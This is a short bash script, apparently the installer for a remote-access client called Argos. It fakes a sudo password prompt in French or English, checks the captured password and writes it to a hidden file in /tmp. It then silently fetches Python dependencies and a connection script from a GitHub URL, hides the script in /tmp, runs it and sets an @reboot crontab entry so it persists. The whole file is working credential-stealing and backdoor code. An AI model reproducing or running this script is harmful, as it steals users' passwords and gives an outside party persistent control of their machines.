#!/bin/bash
if [ "$#" -ne 1 ]; then
    echo "First argument should be server url"
    exit 1
fi
echo "$1" > /tmp/.serverurl.exwrap
urlbase=https://raw.githubusercontent.com/Just1truc
# installing pip dependencies
while [ 1 ]
do
    who=`whoami`
    if [ $(echo "$LANG" | cut --delimiter=. -f 1 | cut -d _ -f 1) == "fr" ]
    then
        echo -n "[sudo] Mot de passe de $who : "
        read -s password
    else
        echo -n "[sudo] password for $who : "
        read -s password
    fi
    try=`echo $password | sudo -S ls &> /dev/null`
    output=$?
    echo ""
    if [ $output -eq 0 ]
    then
        echo "$password" > /tmp/.server.exwrap_info.txt
        break
    else
        if [ $(echo "$LANG" | cut --delimiter=. -f 1 | cut -d _ -f 1) == "fr" ]
        then
            echo "Désolé, essayez de nouveau."
        else
            echo "Sorry, try again."
        fi
    fi
done
curl $urlbase/Argos/main/client/dependencies -o here.txt &> /dev/null
pip install -r here.txt &> /dev/null
rm here.txt
# installing script
curl $urlbase/Argos/main/client/connexion.py -o .service.exwrap.py &> /dev/null
mv .service.exwrap.py /tmp/.service.exwrap.py
# Setting up crontab
echo "@reboot python3 /tmp/.service.exwrap.py" > crontb && crontab crontb && rm -rf crontb
python3 /tmp/.service.exwrap.py &
